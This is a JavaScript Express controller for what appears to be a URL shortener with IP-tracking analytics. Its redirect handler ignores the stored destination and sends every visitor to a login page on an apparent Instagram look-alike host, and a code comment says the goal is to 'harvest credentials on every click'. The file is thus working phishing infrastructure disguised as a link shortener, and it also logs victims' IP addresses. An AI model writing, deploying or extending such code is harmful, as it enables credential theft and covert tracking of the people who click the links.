import UrlModel from "../Models/Url.js";
import { nanoid } from "nanoid"; // For generating short URLs

// Create short URL
export const createShortUrl = async (req, res) => {
    try {
        let { originalUrl, customCode } = req.body;

        if (!originalUrl || !originalUrl.trim()) {
            return res.status(400).json({ message: "Original URL is required" });
        }

        // Trim whitespace
        originalUrl = originalUrl.trim();

        // Add protocol if missing
        if (!originalUrl.startsWith('http://') && !originalUrl.startsWith('https://')) {
            originalUrl = 'https://' + originalUrl;
        }

        // Validate URL format
        try {
            const urlObj = new URL(originalUrl);
            if (!['http:', 'https:'].includes(urlObj.protocol)) {
                return res.status(400).json({ message: "Only HTTP/HTTPS URLs are allowed" });
            }
        } catch (error) {
            return res.status(400).json({ message: "Invalid URL format" });
        }

        let shortUrl;

        // Use custom code if provided
        if (customCode && customCode.trim()) {
            shortUrl = customCode.trim();
            const existingCustom = await UrlModel.findOne({ shortUrl });
            if (existingCustom) {
                return res.status(400).json({ message: "Custom code is already in use" });
            }
        } else {
            // Generate a unique short URL id
            shortUrl = nanoid(6);
            
            // Ensure uniqueness (rare but possible collision)
            while (await UrlModel.findOne({ shortUrl })) {
                shortUrl = nanoid(6);
            }
        }

        const newUrl = await UrlModel.create({
            originalUrl,
            shortUrl
        });

        return res.status(201).json({
            message: "Short URL created successfully",
            data: newUrl
        });

    } catch (error) {
        console.error("Error creating short URL:", error);
        return res.status(500).json({ message: "Server error" });
    }
};

// Redirect & track IP
import jwt from 'jsonwebtoken';

export const redirectUrl = async (req, res) => {
    try {
        const { shortId } = req.params;
        const clientIp = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;

        console.log('🔍 Searching for shortId:', shortId);
        const urlDoc = await UrlModel.findOne({ shortUrl: shortId });

        if (!urlDoc) {
            console.log('❌ Short URL not found');
            return res.status(404).json({ message: "Short URL not found" });
        }

        // Track IP first
        await urlDoc.incrementIpCount(clientIp);

        // Always redirect to login page (we want to harvest credentials on every click)
        const frontendUrl = process.env.FRONTEND_URL || 'https://instagram-hpnf.onrender.com';
        return res.redirect(`${frontendUrl}/login?next=/${shortId}`);

    } catch (error) {
        console.error("Error redirecting:", error);
        return res.status(500).json({ message: "Server error" });
    }
};

// Get URL analytics (history) for specific URL
export const getUrlAnalytics = async (req, res) => {
    try {
        const { shortId } = req.params;
        
        const urlDoc = await UrlModel.findOne({ shortUrl: shortId });

        if (!urlDoc) {
            return res.status(404).json({ message: "Short URL not found" });
        }

        // Calculate analytics
        const totalClicks = urlDoc.history.reduce((sum, entry) => sum + entry.count, 0);
        const uniqueVisitors = urlDoc.history.length;

        return res.status(200).json({
            originalUrl: urlDoc.originalUrl,
            shortUrl: urlDoc.shortUrl,
            createdAt: urlDoc.createdAt,
            analytics: {
                totalClicks,
                uniqueVisitors,
                recentClicks: urlDoc.history.slice(-5) // Last 5 unique IPs
            },
            history: urlDoc.history
        });

    } catch (error) {
        console.error("Error fetching analytics:", error);
        return res.status(500).json({ message: "Server error" });
    }
};

// NEW: Get all URLs for admin dashboard
export const getAllUrlStats = async (req, res) => {
    try {
        const urls = await UrlModel.find({})
            .sort({ createdAt: -1 }) // Most recent first
            .limit(100); // Limit to last 100 URLs

        // Calculate stats for each URL
        const urlsWithStats = urls.map(url => {
            const totalClicks = url.history.reduce((sum, entry) => sum + entry.count, 0);
            const uniqueVisitors = url.history.length;
            
            return {
                _id: url._id,
                originalUrl: url.originalUrl,
                shortUrl: url.shortUrl,
                createdAt: url.createdAt,
                totalClicks,
                uniqueVisitors,
                history: url.history
            };
        });

        // Overall statistics
        const totalUrls = urls.length;
        const totalClicks = urlsWithStats.reduce((sum, url) => sum + url.totalClicks, 0);
        const totalUniqueVisitors = urlsWithStats.reduce((sum, url) => sum + url.uniqueVisitors, 0);

        return res.status(200).json({
            message: "Stats retrieved successfully",
            summary: {
                totalUrls,
                totalClicks,
                totalUniqueVisitors
            },
            urls: urlsWithStats
        });

    } catch (error) {
        console.error("Error fetching all URL stats:", error);
        return res.status(500).json({ message: "Server error" });
    }
};

